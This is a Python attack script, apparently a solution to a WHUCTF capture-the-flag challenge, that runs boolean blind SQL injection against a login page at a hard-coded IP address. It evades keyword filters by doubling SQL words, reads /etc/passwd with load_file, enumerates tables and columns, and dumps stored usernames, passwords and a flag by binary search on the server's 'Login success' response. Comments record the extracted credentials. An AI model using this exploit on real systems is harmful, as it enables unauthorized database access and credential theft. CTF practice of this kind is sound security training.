import requests,urllib
import math
from urllib.parse import quote_plus

#代理配置
proxies = {
 'http': 'http://127.0.0.1:8888',
 'https': 'http://127.0.0.1:8888'
}
proxies = None

#设置消息头
reqHeaders = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en,en-US;q=0.8,zh-CN;q=0.5,zh;q=0.3',
    'Accept-Encoding': 'gzip, deflate, br'
}

postHeaders = reqHeaders.copy()
postHeaders['Referer'] = 'http://218.197.154.9:10011/login.php'
postHeaders['Content-Type'] = 'application/x-www-form-urlencoded'

#定义网址
url = 'http://218.197.154.9:10011/login.php'

"""发送POST数据"""
#数据库名
postStr = """user=aa'or+ascii(substr(database(),{0},1))>{1}--+&pass=admin""".replace('or','oorr')

#系统密码
postStr = """user=aa'or+ascii(substr(load_file('/etc/passwd'),{0},1))>{1}--+&pass=admin""".replace('or','oorr').replace('select','seleselectct')

#获取表名
postStr = """user=aa'or+ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{0},1))>{1}--+&pass=admin""".replace('or','oorr').replace('select','seleselectct').replace('from','frofromm').replace('where','wherwheree')
#f1ag_y0u_wi1l_n3ver_kn0w,users

#用户名和密码
postStr = """user=aa'or+ascii(substr((select group_concat(username,0x2b,password) from users),{0},1))>{1}--+&pass=admin""".replace('or','oorr').replace('select','seleselectct').replace('from','frofromm').replace('where','wherwheree')
#Dumb+Dumb,Angelina+I-kill-you,Dummy+p@ssword,secure+crappy,stupid+stupidity

#获取f1ag字段
postStr = """user=aa'or+ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='f1ag_y0u_wi1l_n3ver_kn0w'),{0},1))>{1}--+&pass=admin""".replace('or','oorr').replace('select','seleselectct').replace('from','frofromm').replace('where','wherwheree')
#f111114g

#获取对应值
postStr = """user=aa'or+ascii(substr((select group_concat(f111114g) from f1ag_y0u_wi1l_n3ver_kn0w),{0},1))>{1}--+&pass=admin""".replace('or','oorr').replace('select','seleselectct').replace('from','frofromm').replace('where','wherwheree')
#WHUCTF{r3lly_re11y_n0t_d1ffIcult_yet??~}

print(postStr)

#设置请求
reqSess = requests.session()
#reqSess.cookies.set('JSESSIONID','87B415C3E689651FF292DA16B32AB3EF')

#Current Bit & Max Bits
cb, mb = 1,4096

#采用二分查重匹配字符串
stillLeft = True
while cb < mb and stillLeft:
    #ascii of start,middle and end
    s,m,e = 0,0,255

    while s < e:
        sqliStr = postStr.format(cb,m)
        #print(sqliStr)
        
        postHeaders['Content-Length']= str(len(postStr))
        #print(postHeaders)

        currentFailedTimes,maxFailedTimes = 0,10
        while currentFailedTimes < maxFailedTimes:
            try:
                rst = reqSess.post(url,sqliStr,headers=postHeaders,
                                   proxies=proxies,allow_redirects=False,verify=False)
                break
            except Exception as ex:
                if currentFailedTimes > 5:
                    print('[X]Failed Times:%d'%(currentFailedTimes))
                currentFailedTimes += 1
                if currentFailedTimes == maxFailedTimes:
                    exit("Too Much Errors,Going To Stop")
        #result is true
        if 'Login success' in rst.text:
            #print("[v]{}:{}->{}->{}".format(cb,s,m,e))
            if e - 1 == m:
                m = e
                break
            s = m
        else:
            #print("[x]{}:{}->{}->{}".format(cb,s,m,e))
            #even > 0 is error,no bits left
            if m == 0:
                stillLeft = False
                break
            if e - 1 == m:
                break
            e = m
        m = s + math.ceil((e - s)/2)
    if not m == 0:
        print(chr(m),end='')
    cb += 1
